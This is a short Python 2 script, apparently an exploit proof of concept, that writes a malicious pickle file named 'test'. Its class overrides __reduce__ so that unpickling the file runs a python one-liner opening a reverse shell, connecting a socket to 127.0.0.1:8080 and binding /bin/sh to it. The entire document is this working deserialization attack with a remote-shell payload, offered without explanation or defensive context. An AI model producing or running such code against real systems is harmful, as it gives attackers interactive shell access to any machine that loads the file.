import os
from pickle import Unpickler as Unpkler
from pickle import Pickler as Pkler
import commands
class chybeta(object):
    def __reduce__(self):
        return (commands.getoutput,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))    
evil = chybeta()
def dump(file):
	pkler = Pkler(file)
	pkler.dump(evil)
with open("test","wb") as f:
	dump(f)
